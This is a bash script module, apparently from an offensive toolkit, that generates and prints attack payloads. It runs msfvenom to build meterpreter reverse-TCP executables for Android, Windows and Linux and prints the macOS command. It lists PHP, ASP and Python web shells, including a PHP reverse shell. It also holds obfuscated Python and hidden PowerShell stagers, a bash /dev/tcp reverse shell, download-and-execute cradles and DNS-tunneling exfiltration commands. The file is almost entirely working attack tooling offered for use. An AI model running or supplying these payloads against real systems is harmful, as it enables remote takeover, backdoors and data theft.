#===============================================================================
#  payload — Payload Generator
#===============================================================================

cmd_payload() {
  module_banner "payload" "Payload generator for penetration testing"
  local sub="${1:-help}"; shift 2>/dev/null || true

  case "$sub" in
    android)     payload_android "$@";;
    windows)     payload_windows "$@";;
    linux)       payload_linux "$@";;
    web|php)     payload_web "$@";;
    mac|macos)   payload_mac "$@";;
    stager)      payload_stager "$@";;
    download)    payload_download "$@";;
    dns|dns-tunnel) payload_dns "$@";;
    --json)      TX_JSON=true; payload_android "$@";;
    -h|--help)
      echo "Usage: tx payload <subcommand> [args]"
      echo "  android <lhost> <lport>  Android payload (APK)"
      echo "  windows <lhost> <lport>  Windows payload (EXE)"
      echo "  linux <lhost> <lport>    Linux payload (ELF)"
      echo "  web                      Web shell payloads"
      echo "  mac <lhost> <lport>      macOS payload"
      echo "  stager <lhost> <lport>   Staged payload"
      echo "  download <url>           Generate download cradle"
      echo "  dns <domain>             DNS tunneling payload"
      ;;
    *) log_error "Unknown: $sub"; exit 1;;
  esac
}

payload_android() {
  local lhost="${1:-}" lport="${2:-4444}"
  [[ -z "$lhost" ]] && { log_error "Usage: tx payload android <lhost> <lport>"; return 1; }
  log_section "Android Payload"
  if command -v msfvenom &>/dev/null; then
    log_info "Generating Android meterpreter reverse TCP..."
    echo "  msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /tmp/payload.apk"
    msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o /tmp/payload.apk 2>/dev/null && log_success "Generated: /tmp/payload.apk"
  else
    log_warn "msfvenom not found. Install metasploit:"
    echo "  pkg install metasploit"
  fi
}

payload_windows() {
  local lhost="${1:-}" lport="${2:-4444}"
  [[ -z "$lhost" ]] && { log_error "Usage: tx payload windows <lhost> <lport>"; return 1; }
  log_section "Windows Payload"
  local outfile="/tmp/payload.exe"
  echo "  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $outfile"
  if command -v msfvenom &>/dev/null; then
    msfvenom -p windows/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$outfile" 2>/dev/null && log_success "Generated: $outfile"
  else
    log_warn "Install msfvenom"
  fi
}

payload_linux() {
  local lhost="${1:-}" lport="${2:-4444}"
  [[ -z "$lhost" ]] && { log_error "Usage: tx payload linux <lhost> <lport>"; return 1; }
  log_section "Linux Payload"
  local outfile="/tmp/payload.elf"
  echo "  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o $outfile"
  if command -v msfvenom &>/dev/null; then
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$outfile" 2>/dev/null && log_success "Generated: $outfile"
  else
    log_warn "Install msfvenom"
  fi
}

payload_web() {
  log_section "Web Shell Payloads"

  echo -e "\n${BOLD}PHP Web Shell:${RESET}"
  cat <<'EOF'
  <?php system($_GET['cmd']); ?>
  <?php exec($_POST['cmd'],$out);print_r($out); ?>
  <?php passthru("id"); ?>
  <?php $s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
EOF

  echo -e "\n${BOLD}ASP Web Shell:${RESET}"
  cat <<'EOF'
  <% Execute("cmd.exe /c " & Request.QueryString("cmd")) %>
EOF

  echo -e "\n${BOLD}Python Web Shell:${RESET}"
  cat <<'EOF'
  import os, sys, cgi; print("Content-Type: text/plain\n"); os.system(" ".join(sys.argv[1:]))
EOF
}

payload_mac() {
  local lhost="${1:-}" lport="${2:-4444}"
  [[ -z "$lhost" ]] && { log_error "Usage: tx payload mac <lhost> <lport>"; return 1; }
  log_section "macOS Payload"
  echo "  msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f macho -o /tmp/payload.macho"
}

payload_stager() {
  local lhost="${1:-}" lport="${2:-4444}"
  [[ -z "$lhost" ]] && { log_error "Usage: tx payload stager <lhost> <lport>"; return 1; }
  log_section "Staged Payloads"

  cat <<EOF

  ${BOLD}Shellcode (Linux x64):${RESET}
  msfvenom -p linux/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f c

  ${BOLD}Python Stager:${RESET}
  python3 -c "import base64,sys;exec(base64.b64decode('...'))"

  ${BOLD}PowerShell Stager:${RESET}
  powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <base64>

  ${BOLD}Bash One-Liner:${RESET}
  bash -c "exec 5<>/dev/tcp/$lhost/$lport;cat<&5|while read l;do \$l 2>&5>&5;done"
EOF
}

payload_download() {
  local url="${1:-}"
  [[ -z "$url" ]] && { log_error "Usage: tx payload download <url>"; return 1; }
  log_section "Download Cradles"

  cat <<EOF

  ${BOLD}Powershell:${RESET}
  powershell -c "Invoke-WebRequest -Uri '$url' -OutFile out.exe"
  powershell -c "(New-Object Net.WebClient).DownloadFile('$url','out.exe')"
  certutil -urlcache -split -f $url out.exe

  ${BOLD}Bash:${RESET}
  curl -O $url
  wget $url

  ${BOLD}Python:${RESET}
  python3 -c "import urllib.request;urllib.request.urlretrieve('$url','out')"

  ${BOLD}PHP:${RESET}
  php -r "file_put_contents('out', fopen('$url', 'r'));"

  ${BOLD}Java:${RESET}
  wget $url -O out.jar && java -jar out.jar
EOF
}

payload_dns() {
  local domain="${1:-}"
  [[ -z "$domain" ]] && { log_error "Usage: tx payload dns <domain>"; return 1; }
  log_section "DNS Tunneling"
  cat <<EOF
  DNS tunneling tools:
    dnscat2    : https://github.com/iagox86/dnscat2
    iodine     : https://github.com/yarrick/iodine
    dns2tcp    : https://github.com/alex-sector/dns2tcp

  Server:   dnscat2-server $domain
  Client:   dnscat2-v0.07-client32.exe $domain

  Encode data in DNS queries:
    dig @8.8.8.8 base64data.$domain TXT
EOF
}
